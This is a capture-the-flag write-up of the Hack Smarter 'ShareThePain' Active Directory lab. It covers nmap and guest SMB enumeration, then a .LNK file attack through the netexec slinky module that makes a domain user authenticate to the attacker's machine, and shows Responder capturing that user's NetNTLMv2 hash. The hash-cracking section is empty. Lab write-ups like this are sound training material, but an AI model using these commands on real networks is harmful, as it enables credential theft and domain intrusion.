# ShareThePain (Hack Smarter Labs)

![Certificate-of-Completion](stp-images/<>_ad_challenge_certificate.jpg)

## Scope and Objective

**Objective:** You're a **penetration tester** on the **Hack Smarter Red Team**. Your mission is to infiltrate and seize control of the client's entire Active Directory environment. This isn't just a test; it's a full-scale assault to expose and exploit every vulnerability.

**Initial Access:** For this engagement, you've been granted direct access to the internal network but no credentials.

**Execution:** Your objective is simple but demanding: **enumerate, exploit, and own.** Your ultimate goal is not just to get in, but to achieve a **full compromise**, elevating your privileges until you hold the keys to the entire domain.

---

## Initial Recon

### Nmap Scan
As usual, starting with a simple `nmap` scan:
```bash
nmap 10.1.29.125                   
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-26 10:15 PKT
Stats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 80.60% done; ETC: 10:15 (0:00:00 remaining)
Nmap scan report for 10.1.29.125
Host is up (0.27s latency).
Not shown: 987 closed tcp ports (reset)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 105.56 seconds
```
Standard `AD` ports are open.

Now, going for an aggressive `nmap` scan:
```bash
nmap -A -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985 10.1.29.125 -o nmap-scan.log
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-26 10:18 PKT
Nmap scan report for 10.1.29.125
Host is up (0.22s latency).

PORT     STATE  SERVICE       VERSION
53/tcp   open   domain        Simple DNS Plus
88/tcp   open   kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-26 05:19:12Z)
135/tcp  open   msrpc         Microsoft Windows RPC
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open   ldap          Microsoft Windows Active Directory LDAP (Domain: hack.smarter0., Site: Default-First-Site-Name)
445/tcp  open   microsoft-ds?
464/tcp  open   kpasswd5?
593/tcp  open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open   tcpwrapped
3268/tcp open   ldap          Microsoft Windows Active Directory LDAP (Domain: hack.smarter0., Site: Default-First-Site-Name)
3269/tcp open   tcpwrapped
3389/tcp open   ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.hack.smarter
| Not valid before: 2025-09-05T03:46:00
|_Not valid after:  2026-03-07T03:46:00
| rdp-ntlm-info: 
|   Target_Name: HACK
|   NetBIOS_Domain_Name: HACK
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: hack.smarter
|   DNS_Computer_Name: DC01.hack.smarter
|   DNS_Tree_Name: hack.smarter
|   Product_Version: 10.0.20348
|_  System_Time: 2025-12-26T05:19:57+00:00
|_ssl-date: 2025-12-26T05:20:07+00:00; +2s from scanner time.
5985/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=12/26%OT=53%CT=80%CU=43516%PV=Y%DS=3%DC=T%G=Y%TM=694E1
OS:B0C%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10C%TI=I%CI=I%TS=9)SEQ(SP
OS:=102%GCD=1%ISR=10B%TI=I%CI=I%TS=A)SEQ(SP=106%GCD=1%ISR=10A%TI=I%CI=I%TS=
OS:A)SEQ(SP=107%GCD=1%ISR=106%TI=I%CI=I%TS=A)SEQ(SP=107%GCD=1%ISR=109%TI=I%
OS:CI=I%TS=A)OPS(O1=M578NW8ST11%O2=M578NW8ST11%O3=M578NW8NNT11%O4=M578NW8ST
OS:11%O5=M578NW8ST11%O6=M578ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFF
OS:F%W6=FFDC)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80
OS:%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=
OS:%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%
OS:W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%R
OS:ID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=N)

Network Distance: 3 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-12-26T05:19:59
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 1s, deviation: 0s, median: 1s

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   216.55 ms 10.200.0.1
2   ...
3   218.24 ms 10.1.29.125

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 76.83 seconds

```
Nothing interesting to note here.

I'll add the DNS Domain & Computer names to my `/etc/hosts` file:
```bash
10.1.29.125  hack.smarter DC01.hack.smarter
```

### SMB Enumeration
Since I don't have any domain credentials, I'll try guest user login on SMB:
```bash
nxc smb 10.1.29.125 -u 'guest' -p '' --shares           
SMB         10.1.29.125     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hack.smarter) (signing:True) (SMBv1:None) (Null Auth:True)                                                                                                                                                
SMB         10.1.29.125     445    DC01             [+] hack.smarter\guest: 
SMB         10.1.29.125     445    DC01             [*] Enumerated shares
SMB         10.1.29.125     445    DC01             Share           Permissions     Remark
SMB         10.1.29.125     445    DC01             -----           -----------     ------
SMB         10.1.29.125     445    DC01             ADMIN$                          Remote Admin
SMB         10.1.29.125     445    DC01             C$                              Default share
SMB         10.1.29.125     445    DC01             IPC$            READ            Remote IPC
SMB         10.1.29.125     445    DC01             NETLOGON                        Logon server share 
SMB         10.1.29.125     445    DC01             Share           READ,WRITE      
SMB         10.1.29.125     445    DC01             SYSVOL                          Logon server share
```
The guest user is indeed enabled, and we have a writable share.
```bash
smbclient \\\\10.1.29.125\\Share -U 'guest'
Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Dec 26 10:40:47 2025
  ..                                DHS        0  Sat Sep  6 08:46:21 2025

                31292671 blocks of size 4096. 27375567 blocks available
smb: \>
```

---

## .LNK File Attack

With a writable share on SMB, I'll perform the `.LNK` file attack and hopefully grab a domain user's password hash.

First, I used `netexec` to create the malicious `.LNK` file and write it to the share:
```bash
nxc smb 10.1.29.125 -u 'guest' -p '' -M slinky -o name=hello server=10.200.25.186   
SMB         10.1.29.125     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hack.smarter) (signing:True) (SMBv1:None) (Null Auth:True)                                                                                                                                                
SMB         10.1.29.125     445    DC01             [+] hack.smarter\guest: 
SMB         10.1.29.125     445    DC01             [*] Enumerated shares
SMB         10.1.29.125     445    DC01             Share           Permissions     Remark
SMB         10.1.29.125     445    DC01             -----           -----------     ------
SMB         10.1.29.125     445    DC01             ADMIN$                          Remote Admin
SMB         10.1.29.125     445    DC01             C$                              Default share
SMB         10.1.29.125     445    DC01             IPC$            READ            Remote IPC
SMB         10.1.29.125     445    DC01             NETLOGON                        Logon server share 
SMB         10.1.29.125     445    DC01             Share           READ,WRITE      
SMB         10.1.29.125     445    DC01             SYSVOL                          Logon server share 
SLINKY      10.1.29.125     445    DC01             [+] Found writable share: Share
SLINKY      10.1.29.125     445    DC01             [+] Created LNK file on the Share share

smbclient \\\\10.1.29.125\\Share -U 'guest'
Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Dec 26 10:46:21 2025
  ..                                DHS        0  Sat Sep  6 08:46:21 2025
  hello.lnk                           A      948  Fri Dec 26 10:46:22 2025

                31292671 blocks of size 4096. 27375595 blocks available
smb: \> exit
```
Next, I spun up `responder` to listen for connections:
```bash
sudo responder -I tun0 -dP                 
[sudo] password for kali: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [ON]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.200.25.186]
    Responder IPv6             [fe80::1051:fe69:f55:b158]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-86IOHD5NWEA]
    Responder Domain Name      [1SMU.LOCAL]
    Responder DCE-RPC Port     [47050]

[*] Version: Responder 3.1.7.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
[*] To sponsor Responder: https://paypal.me/PythonResponder

[+] Listening for events...                                                                                                                                  

[SMB] NTLMv2-SSP Client   : 10.1.29.125
[SMB] NTLMv2-SSP Username : HACK\bob.ross
[SMB] NTLMv2-SSP Hash     : bob.ross::HACK:9a1b53efe6733fb4:092A95A565A3514B42576817424609B7:01010000000000000097BDF75476DC019E2DB3EED249E21A0000000002000800310053004D00550001001E00570049004E002D003800360049004F004800440035004E0057004500410004003400570049004E002D003800360049004F004800440035004E005700450041002E00310053004D0055002E004C004F00430041004C0003001400310053004D0055002E004C004F00430041004C0005001400310053004D0055002E004C004F00430041004C00070008000097BDF75476DC0106000400020000000800300030000000000000000100000000200000FDF469E3A91B5013B7CDB2E2DD11F47C8BA90685F96E7DEE3986C1AE957C442A0A001000000000000000000000000000000000000900240063006900660073002F00310030002E003200300030002E00320035002E003100380036000000000000000000
```
Sure enough, I got a `NetNTLMv2` password hash of the `bob.ross` user.

---

## Hash Cracking

```bash

```
